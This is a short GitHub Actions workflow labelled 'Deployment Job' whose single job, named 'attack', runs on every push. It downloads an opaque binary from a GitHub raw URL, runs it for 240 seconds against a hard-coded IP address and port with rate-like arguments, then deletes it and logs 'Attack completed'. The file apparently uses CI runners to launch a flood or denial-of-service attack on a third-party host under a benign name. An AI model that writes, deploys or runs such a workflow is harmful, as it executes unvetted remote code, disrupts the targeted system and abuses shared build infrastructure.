name: Deployment Job
on: [push, workflow_dispatch]

jobs:
  attack:
    runs-on: ubuntu-latest
    steps:
    - name: Checkout code
      uses: actions/checkout@v3
    
    - name: Setup environment
      run: |
        apt-get update
        apt-get install -y wget curl
        
    - name: Download binary
      run: |
        wget -q https://github.com/user/bin/raw/main/process -O process
        chmod +x process
        
    - name: Execute attack
      run: |
        timeout 240 ./process 34.0.12.34 20316 240 999
        
    - name: Cleanup
      run: |
        rm -f process
        echo "Attack completed at $(date)"
